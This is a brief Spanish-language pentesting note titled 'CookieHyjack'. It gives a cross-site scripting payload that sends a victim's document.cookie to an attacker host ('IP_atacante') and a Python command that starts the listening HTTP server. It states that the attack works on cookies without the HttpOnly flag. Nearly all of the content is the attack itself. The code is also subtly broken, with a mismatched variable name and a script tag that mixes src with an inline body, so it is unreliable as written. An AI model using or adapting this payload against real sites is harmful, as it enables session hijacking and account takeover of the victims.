# CookieHyjack

Este script básico funciona siempre y cuando la cookie del usuario victima tenga en false la propiedad HttpOnly&#x20;

```
python3 -m http.server 80
```

```
<script src="IP_atacante/fichero.js">      
    var request = new XMLHttpRequest();
    Request.open('GET', 'http://IP_atacante/?cookie=' + document.cookie);
    request.send();
</script>
```

<div align="left">

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="563"><figcaption></figcaption></figure>

</div>
